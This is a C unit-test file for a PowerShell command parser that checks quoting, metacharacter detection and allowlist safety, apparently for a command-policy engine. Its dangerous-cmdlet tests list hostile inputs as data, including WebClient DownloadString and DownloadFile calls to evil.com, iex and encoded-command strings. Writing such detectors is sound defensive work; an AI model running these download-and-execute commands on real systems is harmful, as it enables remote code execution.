/**
 * Unit tests for PowerShell command parsing
 *
 * Tests PowerShell-specific tokenization, quote handling,
 * metacharacter detection, and dangerous cmdlet matching.
 *
 * These tests verify the implementation of parse_powershell() with
 * proper PowerShell semantics:
 * - Both single and double quotes are string delimiters
 * - Metacharacters: ; | && || $ {} () > < `
 * - & and . as call operators at expression start
 * - $variable expansion
 * - Script blocks {}
 * - Subexpressions $()
 * - Backtick ` as escape character
 * - Dangerous cmdlets (case-insensitive)
 */

#include "unity.h"
#include "policy/shell_parser.h"

#include <stdlib.h>
#include <string.h>

void setUp(void) {}
void tearDown(void) {}

/* ============================================================================
 * Basic Tokenization Tests
 * ========================================================================== */

void test_ps_parse_simple_command(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-ChildItem", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(SHELL_TYPE_POWERSHELL, cmd->shell_type);
    TEST_ASSERT_EQUAL_INT(1, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("Get-ChildItem", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_INT(0, cmd->has_chain);
    TEST_ASSERT_EQUAL_INT(0, cmd->has_pipe);
    TEST_ASSERT_EQUAL_INT(0, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

void test_ps_parse_command_with_arguments(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-ChildItem -Path /tmp -Recurse", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(4, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("Get-ChildItem", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("-Path", cmd->tokens[1]);
    TEST_ASSERT_EQUAL_STRING("/tmp", cmd->tokens[2]);
    TEST_ASSERT_EQUAL_STRING("-Recurse", cmd->tokens[3]);
    free_parsed_shell_command(cmd);
}

void test_ps_parse_empty_command(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, cmd->token_count);
    free_parsed_shell_command(cmd);
}

void test_ps_parse_null_command(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type(NULL, SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NULL(cmd);
}

void test_ps_parse_multiple_spaces(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-Content   file.txt", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(2, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("Get-Content", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("file.txt", cmd->tokens[1]);
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Double Quote Handling
 * ========================================================================== */

void test_ps_double_quoted_argument(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output \"hello world\"", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(2, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("Write-Output", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("hello world", cmd->tokens[1]);
    free_parsed_shell_command(cmd);
}

void test_ps_double_quoted_with_path(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Set-Location \"C:\\Program Files\\App\"", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(2, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("Set-Location", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("C:\\Program Files\\App", cmd->tokens[1]);
    free_parsed_shell_command(cmd);
}

void test_ps_double_quoted_with_variable_flagged(void) {
    /* Variable expansion inside double quotes should be flagged */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output \"Hello $name\"", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_subshell);  /* Variable expansion flagged */
    free_parsed_shell_command(cmd);
}

void test_ps_empty_double_quotes(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output \"\" arg", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(3, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("Write-Output", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("", cmd->tokens[1]);
    TEST_ASSERT_EQUAL_STRING("arg", cmd->tokens[2]);
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Single Quote Handling (Literal Content)
 * ========================================================================== */

void test_ps_single_quoted_argument(void) {
    /* Single quotes are literal in PowerShell - no escape sequences */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output 'hello world'", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(2, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("Write-Output", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("hello world", cmd->tokens[1]);
    free_parsed_shell_command(cmd);
}

void test_ps_single_quoted_no_variable_expansion(void) {
    /* Variables inside single quotes should NOT cause flag */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output '$var'", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    /* Single quotes are literal, $var is not expanded */
    TEST_ASSERT_EQUAL_INT(0, cmd->has_subshell);
    free_parsed_shell_command(cmd);
}

void test_ps_single_quoted_preserves_special_chars(void) {
    /* Special chars in single quotes are literal */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output '; | && { }'", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    /* No chain/pipe/subshell since they're inside single quotes */
    TEST_ASSERT_EQUAL_INT(0, cmd->has_chain);
    TEST_ASSERT_EQUAL_INT(0, cmd->has_pipe);
    free_parsed_shell_command(cmd);
}

void test_ps_empty_single_quotes(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output '' arg", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(3, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("Write-Output", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("", cmd->tokens[1]);
    TEST_ASSERT_EQUAL_STRING("arg", cmd->tokens[2]);
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Metacharacter Detection: ; (Semicolon - Command Separator)
 * ========================================================================== */

void test_ps_semicolon_chain_detected(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-Date; Get-Location", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_chain);
    free_parsed_shell_command(cmd);
}

void test_ps_semicolon_quoted_not_chain(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output \"a;b\"", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, cmd->has_chain);
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Metacharacter Detection: && and || (Pipeline Chain Operators - PS 7+)
 * ========================================================================== */

void test_ps_double_ampersand_chain_detected(void) {
    /* && is pipeline chain operator (AND) in PS 7+ */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Test-Path foo && Get-Content foo", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_chain);
    free_parsed_shell_command(cmd);
}

void test_ps_double_pipe_chain_detected(void) {
    /* || is pipeline chain operator (OR) in PS 7+ */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Test-Path foo || Write-Error 'Not found'", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_chain);
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Metacharacter Detection: | (Pipe)
 * ========================================================================== */

void test_ps_pipe_detected(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-Process | Where-Object CPU -gt 10", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_pipe);
    free_parsed_shell_command(cmd);
}

void test_ps_pipe_quoted_not_detected(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output \"|\"", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, cmd->has_pipe);
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Metacharacter Detection: > >> < (Redirection)
 * ========================================================================== */

void test_ps_redirect_output_detected(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-Date > date.txt", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_redirect);
    free_parsed_shell_command(cmd);
}

void test_ps_redirect_append_detected(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output hello >> log.txt", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_redirect);
    free_parsed_shell_command(cmd);
}

void test_ps_redirect_input_detected(void) {
    /* While less common in PS, < is still a redirect operator */
    ParsedShellCommand *cmd = parse_shell_command_for_type("some-cmd < input.txt", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_redirect);
    free_parsed_shell_command(cmd);
}

void test_ps_redirect_quoted_not_detected(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output \"<>\"", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, cmd->has_redirect);
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Metacharacter Detection: $ (Variable and Subexpression)
 * ========================================================================== */

void test_ps_variable_detected(void) {
    /* $variable expansion should be flagged */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output $env:PATH", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_subshell);
    free_parsed_shell_command(cmd);
}

void test_ps_subexpression_detected(void) {
    /* $() subexpression should be flagged */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output $(Get-Date)", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_subshell);
    free_parsed_shell_command(cmd);
}

void test_ps_variable_in_single_quotes_not_detected(void) {
    /* $variable inside single quotes is literal */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output '$var'", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, cmd->has_subshell);
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Metacharacter Detection: {} (Script Block)
 * ========================================================================== */

void test_ps_script_block_detected(void) {
    /* Script blocks {} should be flagged as subshell */
    ParsedShellCommand *cmd = parse_shell_command_for_type("ForEach-Object { $_.Name }", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_subshell);
    free_parsed_shell_command(cmd);
}

void test_ps_script_block_in_where_object(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-Process | Where-Object {$_.CPU -gt 100}", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_subshell);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_pipe);
    free_parsed_shell_command(cmd);
}

void test_ps_script_block_quoted_not_detected(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output '{}'", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, cmd->has_subshell);
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Metacharacter Detection: & (Call Operator)
 * ========================================================================== */

void test_ps_call_operator_detected(void) {
    /* & at start of expression is call operator */
    ParsedShellCommand *cmd = parse_shell_command_for_type("& 'C:\\Program Files\\app.exe'", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_subshell);
    free_parsed_shell_command(cmd);
}

void test_ps_call_operator_with_variable(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("& $myCommand", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_subshell);
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Metacharacter Detection: . (Dot-Source Operator)
 * ========================================================================== */

void test_ps_dot_source_detected(void) {
    /* . at start followed by space is dot-source operator */
    ParsedShellCommand *cmd = parse_shell_command_for_type(". ./script.ps1", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_subshell);
    free_parsed_shell_command(cmd);
}

void test_ps_dot_in_path_not_dot_source(void) {
    /* . in middle of command is not dot-source */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-ChildItem ./folder", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    /* Should not be flagged as subshell - dot is part of path */
    TEST_ASSERT_EQUAL_INT(0, cmd->has_subshell);
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Metacharacter Detection: ` (Backtick Escape)
 * ========================================================================== */

void test_ps_backtick_escape_detected(void) {
    /* Backtick is PowerShell's escape character */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output hello`nworld", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    /* Backtick presence makes command unsafe for matching */
    TEST_ASSERT_EQUAL_INT(1, cmd->has_chain);
    free_parsed_shell_command(cmd);
}

void test_ps_backtick_in_double_quotes_handled(void) {
    /* Backtick in double quotes escapes the next character */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output \"`$not_a_var\"", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    /* Escaped $ in double quotes, not a real variable */
    TEST_ASSERT_EQUAL_INT(0, cmd->has_subshell);
    free_parsed_shell_command(cmd);
}

void test_ps_backtick_in_single_quotes_literal(void) {
    /* Backtick in single quotes is literal */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output '`n'", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    /* Backtick inside single quotes is not escape */
    TEST_ASSERT_EQUAL_INT(0, cmd->has_chain);
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Unbalanced Quotes
 * ========================================================================== */

void test_ps_unbalanced_double_quotes_flagged(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output \"unclosed", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, shell_command_is_safe_for_matching(cmd));
    free_parsed_shell_command(cmd);
}

void test_ps_unbalanced_single_quotes_flagged(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output 'unclosed", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, shell_command_is_safe_for_matching(cmd));
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Dangerous Cmdlets (Case-Insensitive)
 * ========================================================================== */

void test_ps_invoke_expression_dangerous(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Invoke-Expression 'Get-Date'", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

void test_ps_invoke_expression_case_insensitive(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("invoke-expression 'Get-Date'", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

void test_ps_iex_alias_dangerous(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("iex $code", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

void test_ps_invoke_command_dangerous(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Invoke-Command -ScriptBlock {Get-Date}", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

void test_ps_icm_alias_dangerous(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("icm -ScriptBlock {Get-Date}", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

void test_ps_start_process_dangerous(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Start-Process notepad.exe", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

void test_ps_invoke_webrequest_dangerous(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Invoke-WebRequest https://example.com", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

void test_ps_iwr_alias_dangerous(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("iwr https://example.com", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

void test_ps_invoke_restmethod_dangerous(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Invoke-RestMethod https://api.example.com", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

void test_ps_irm_alias_dangerous(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("irm https://api.example.com", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

void test_ps_encoded_command_dangerous(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("powershell -EncodedCommand ZWNobyAiaGVsbG8i", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

void test_ps_enc_short_form_dangerous(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("pwsh -enc ZWNobyAiaGVsbG8i", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

void test_ps_downloadstring_dangerous(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("(New-Object Net.WebClient).DownloadString('http://evil.com')", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

void test_ps_downloadfile_dangerous(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("(New-Object Net.WebClient).DownloadFile('http://evil.com/file','file')", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

void test_ps_safe_command_not_dangerous(void) {
    /* Safe commands should not be flagged */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-ChildItem -Path /tmp", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

void test_ps_get_content_not_dangerous(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-Content file.txt", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, cmd->is_dangerous);
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Allowlist Matching
 * ========================================================================== */

void test_ps_simple_match(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-ChildItem -Path /tmp", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);

    const char *prefix[] = {"Get-ChildItem"};
    TEST_ASSERT_EQUAL_INT(1, shell_command_matches_prefix(cmd, prefix, 1));
    free_parsed_shell_command(cmd);
}

void test_ps_prefix_match(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("git status -s", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);

    const char *prefix[] = {"git", "status"};
    TEST_ASSERT_EQUAL_INT(1, shell_command_matches_prefix(cmd, prefix, 2));
    free_parsed_shell_command(cmd);
}

void test_ps_no_match_with_chain(void) {
    /* Commands with chains should never match */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-Date; Get-Location", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);

    const char *prefix[] = {"Get-Date"};
    TEST_ASSERT_EQUAL_INT(0, shell_command_matches_prefix(cmd, prefix, 1));
    free_parsed_shell_command(cmd);
}

void test_ps_no_match_with_pipe(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-Process | Where-Object CPU -gt 10", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);

    const char *prefix[] = {"Get-Process"};
    TEST_ASSERT_EQUAL_INT(0, shell_command_matches_prefix(cmd, prefix, 1));
    free_parsed_shell_command(cmd);
}

void test_ps_no_match_with_variable(void) {
    /* Commands with variable expansion should not match */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output $env:PATH", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);

    const char *prefix[] = {"Write-Output"};
    TEST_ASSERT_EQUAL_INT(0, shell_command_matches_prefix(cmd, prefix, 1));
    free_parsed_shell_command(cmd);
}

void test_ps_no_match_with_script_block(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("ForEach-Object { $_.Name }", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);

    const char *prefix[] = {"ForEach-Object"};
    TEST_ASSERT_EQUAL_INT(0, shell_command_matches_prefix(cmd, prefix, 1));
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Safety Check
 * ========================================================================== */

void test_ps_safe_simple_command(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-ChildItem", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, shell_command_is_safe_for_matching(cmd));
    free_parsed_shell_command(cmd);
}

void test_ps_not_safe_with_chain(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-Date; Get-Location", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, shell_command_is_safe_for_matching(cmd));
    free_parsed_shell_command(cmd);
}

void test_ps_not_safe_with_variable(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output $env:PATH", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, shell_command_is_safe_for_matching(cmd));
    free_parsed_shell_command(cmd);
}

void test_ps_not_safe_with_backtick(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output hello`nworld", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, shell_command_is_safe_for_matching(cmd));
    free_parsed_shell_command(cmd);
}

void test_ps_not_safe_with_call_operator(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("& script.ps1", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, shell_command_is_safe_for_matching(cmd));
    free_parsed_shell_command(cmd);
}

/* ============================================================================
 * Utility Functions
 * ========================================================================== */

void test_ps_get_base_command(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-ChildItem -Path /tmp -Recurse", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_STRING("Get-ChildItem", shell_command_get_base(cmd));
    free_parsed_shell_command(cmd);
}

void test_ps_copy_command(void) {
    ParsedShellCommand *orig = parse_shell_command_for_type("Get-Content file.txt", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(orig);

    ParsedShellCommand *copy = copy_parsed_shell_command(orig);
    TEST_ASSERT_NOT_NULL(copy);
    TEST_ASSERT_EQUAL_INT(SHELL_TYPE_POWERSHELL, copy->shell_type);
    TEST_ASSERT_EQUAL_INT(orig->token_count, copy->token_count);
    TEST_ASSERT_EQUAL_STRING(orig->tokens[0], copy->tokens[0]);

    free_parsed_shell_command(orig);
    free_parsed_shell_command(copy);
}

/* ============================================================================
 * Edge Cases
 * ========================================================================== */

void test_ps_whitespace_only(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("   \t  ", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(0, cmd->token_count);
    free_parsed_shell_command(cmd);
}

void test_ps_path_with_backslashes(void) {
    /* Windows paths use backslashes */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-Content C:\\Users\\test\\file.txt", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(2, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("Get-Content", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("C:\\Users\\test\\file.txt", cmd->tokens[1]);
    /* Backslash is NOT an escape character in PS (backtick is) */
    TEST_ASSERT_EQUAL_INT(0, cmd->has_chain);
    free_parsed_shell_command(cmd);
}

void test_ps_quoted_path_with_spaces(void) {
    ParsedShellCommand *cmd = parse_shell_command_for_type("Set-Location 'C:\\Program Files\\app'", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(2, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("Set-Location", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("C:\\Program Files\\app", cmd->tokens[1]);
    free_parsed_shell_command(cmd);
}

void test_ps_mixed_quote_types(void) {
    /* Single and double quotes can be mixed */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Write-Output 'hello' \"world\"", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(3, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("Write-Output", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("hello", cmd->tokens[1]);
    TEST_ASSERT_EQUAL_STRING("world", cmd->tokens[2]);
    free_parsed_shell_command(cmd);
}

void test_ps_cmdlet_with_hyphen(void) {
    /* PowerShell cmdlets use Verb-Noun format */
    ParsedShellCommand *cmd = parse_shell_command_for_type("Get-Process -Name pwsh", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(3, cmd->token_count);
    TEST_ASSERT_EQUAL_STRING("Get-Process", cmd->tokens[0]);
    TEST_ASSERT_EQUAL_STRING("-Name", cmd->tokens[1]);
    TEST_ASSERT_EQUAL_STRING("pwsh", cmd->tokens[2]);
    free_parsed_shell_command(cmd);
}

void test_ps_array_notation(void) {
    /* Array notation @() - parentheses should flag subshell */
    ParsedShellCommand *cmd = parse_shell_command_for_type("$arr = @(1, 2, 3)", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_subshell);  /* $ and () */
    free_parsed_shell_command(cmd);
}

void test_ps_hashtable_notation(void) {
    /* Hashtable notation @{} - braces should flag subshell */
    ParsedShellCommand *cmd = parse_shell_command_for_type("$hash = @{key='value'}", SHELL_TYPE_POWERSHELL);
    TEST_ASSERT_NOT_NULL(cmd);
    TEST_ASSERT_EQUAL_INT(1, cmd->has_subshell);  /* $ and {} */
    free_parsed_shell_command(cmd);
}

